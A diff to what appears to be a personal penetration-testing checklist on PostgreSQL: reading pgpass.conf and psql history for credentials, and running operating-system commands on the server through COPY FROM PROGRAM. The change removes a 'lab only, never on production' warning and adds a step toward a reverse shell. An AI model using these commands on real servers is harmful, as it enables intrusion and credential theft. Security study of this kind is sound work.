@@ -48,11 +48,13 @@ type "$env:APPDATA\postgresql\pgpass.conf"
 - [ ] psql history gives databases, roles, queries and pasted secrets; HISTFILE or PSQL_HISTORY can move it
 - [ ] pgpass lines are host:port:database:username:password, with backslash escaping for a colon or backslash
 
-## Lab only: commands through COPY PROGRAM
-Never on an exam or production box. First both role and OS prerequisites must hold: superuser or pg_execute_server_program, and the server's OS account able to run the command.
+## Commands through COPY PROGRAM
+Only with superuser or pg_execute_server_program; the command runs on the server as its OS account:
 SELECT rolsuper, pg_has_role(current_user, 'pg_execute_server_program', 'member') AS may_execute FROM pg_roles WHERE rolname = current_user;
-COPY (SELECT 'proof') TO PROGRAM 'id > /tmp/postgresql-proof';
-- [ ] The command ran on the server as the PostgreSQL service account, not on Kali and not as root by default
-- [ ] /tmp/postgresql-proof read through an existing shell, or with pg_read_file only if pg_read_server_files is also held
-COPY (SELECT '') TO PROGRAM 'rm -f /tmp/postgresql-proof';
-- [ ] Every file and process made for the lab removed; a reverse shell, when the lab allows it, is :Pb shells
+CREATE TABLE cmd_out (line text);
+COPY cmd_out FROM PROGRAM 'id';
+SELECT * FROM cmd_out;
+DROP TABLE cmd_out;
+- [ ] The output came back as the PostgreSQL service account, usually postgres, not root
+- [ ] A shell from here: the one-liner in the quotes, from :Pb shells, with a listener up
+- [ ] cmd_out dropped afterwards, and every file I made on the server noted for clean up
